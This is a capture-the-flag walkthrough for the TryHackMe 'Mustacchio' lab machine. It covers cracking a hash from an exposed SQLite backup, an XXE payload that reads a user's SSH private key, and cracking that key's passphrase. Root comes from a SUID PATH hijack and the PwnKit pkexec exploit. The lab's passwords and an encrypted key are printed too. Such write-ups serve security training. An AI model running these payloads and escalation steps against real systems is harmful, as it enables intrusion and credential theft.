---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - Brute-Force
  - XXE
  - SUID
  - File-Analysis
  - PATH-HJ
  - PwnKit
  - Security-SW
---
https://tryhackme.com/room/mustacchio/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.152.152 mustacchio.thm
```
# Scanning
```console
$ nmap -p22,80,8765 -sV -sC mustacchio.thm

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The service running in port 8765 is a custom login panel.
# Enumeration
## SQLite3
Discovered `/custom` directory in main website:
```console
$ gobuster dir -q -r -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://mustacchio.thm/

/images               (Status: 200) [Size: 6169]
/custom               (Status: 200) [Size: 1117]
/fonts                (Status: 200) [Size: 1145]
```
There is a directory list website at `/custom`. Found interesting file `/custom/js/users.bak`.

Extracted **admin password hash** inside the `users.bak` SQLite3 file:
```console
$ file users.bak
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2

$ sqlite3 users.bak

sqlite> .tables
users

sqlite> .schema
CREATE TABLE users(username text NOT NULL, password text NOT NULL);

sqlite> SELECT username,password FROM users;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```
Cracked **admin password** using [CrackStation](https://crackstation.net/): `bulldog19`.
## XXE
Successful log in as **admin** in login panel at port 8765. The website is a comment submission form that receives XML data.

Found that **user barry** has enabled SSH and discovered `/auth/dontforget.bak` file in the comments of [home.php](http://mustacchio.thm:8765/home.php) (only available after log in):
```
//document.cookie = "Example=/auth/dontforget.bak"; 

<!-- Barry, you can now SSH in using your key!-->
```
The `dontforget.bak` is an XML file and shows us the correct format within the form. So, we modify it to show **barry**'s SSH private key and submit it:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY ext SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>&ext;</name>
  <author>FOO</author>
  <com>BAR</com>
</comment>
```
# Cracking SSH
Saved **barry**'s private key as `id_rsa`, but it is encrypted:
```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```
Cracked **barry**'s SSH **passphrase**:
```console
$ ssh2john id_rsa > id_rsa.hash

$ john --wordlist=/usr/share/dict/rockyou.txt id_rsa.hash
urieljames       (id_rsa)
```
Connect as **barry** via SSH:
```bash
ssh -i id_rsa barry@mustacchio.thm
```
Get the **user flag**:
```bash
cat /home/barry/user.txt
```
# Post-Exploitation
## Abusing SUID
Found **user joe**:
```console
$ grep home /etc/passwd

syslog:x:104:108::/home/syslog:/bin/false
joe:x:1002:1002::/home/joe:/bin/bash
barry:x:1003:1003::/home/barry:/bin/bash
```
Found `/home/joe/live_log` with **SUID privileges**:
```console
$ find / -perm -4000 2>/dev/null

/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
```
The binary calls the `tail` command without full path. So, we do a PATH hijacking:
```console
$ strings /home/joe/live_log | grep -vE '^\.|^\_'
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
setgid
GLIBC_2.2.5
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
completed.8060
frame_dummy
demo.c
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
main
setgid@@GLIBC_2.2.5
setuid@@GLIBC_2.2.5

$ echo '/bin/bash -p' > /tmp/tail

$ chmod +x /tmp/tail

$ export PATH=/tmp:$PATH

$ /home/joe/live_log
```
Get the **root flag**:
```bash
cat /root/root.txt
```
## PwnKit (alternative)
Found vulnerable version of `/usr/bin/pkexec` with **SUID privileges**:
```console
$ ls -l /usr/bin/pkexec
-rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec

$ /usr/bin/pkexec --version
pkexec version 0.105
```
In the local machine, clone the [PwnKit repository](https://github.com/ly4k/PwnKit) and transfer the exploit via SSH:
>**NOTE:** the system blocks our current user (**barry**) to make any type of external requests like using `ping`, `curl`, `wget`, etc. Seems like SSH is the only functional service.
```console
$ git clone https://github.com/ly4k/PwnKit.git

$ scp -i id_rsa PwnKit/PwnKit barry@mustacchio.thm:/tmp/
Enter passphrase for key 'id_rsa':
```
Run the exploit in the target machine:
```console
$ chmod +x /tmp/PwnKit

$ /tmp/PwnKit

# whoami
root
```